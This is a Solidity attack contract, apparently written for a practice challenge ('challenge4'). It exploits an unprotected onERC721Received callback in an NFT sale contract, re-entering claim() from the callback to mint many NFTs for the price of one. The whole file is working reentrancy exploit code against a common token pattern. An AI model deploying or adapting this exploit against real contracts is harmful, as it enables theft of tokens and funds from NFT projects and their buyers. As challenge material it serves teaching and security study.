// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.7;

/**
 * @title Attack contract for challenge4
 * @author PULAMARASETTI NAVEEN(Purple_Calender)
 * @notice minting multiple NFTs for one NFT price
 * @dev loophole is unprotected callback to the recepient
 * @custom:experimental this contract only for experimental puprose
 */

interface ISafeMint {
    function totalSupply() external view returns (uint256);

    function buyNFT() external payable;

    function claim() external;
}

contract Attack {
    ///traget contract address
    address public targetAddr;

    constructor(address addr) payable {
        targetAddr = addr;
    }

    function Buy() external {
        ISafeMint(targetAddr).buyNFT{value: 10000000000000000 wei}();
    }

    function claimNFT() external {
        ISafeMint(targetAddr).claim();
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) public returns (bytes4) {
        if (ISafeMint(targetAddr).totalSupply() < 100) {
            ISafeMint(targetAddr).claim();
        }
        return this.onERC721Received.selector;
    }
}
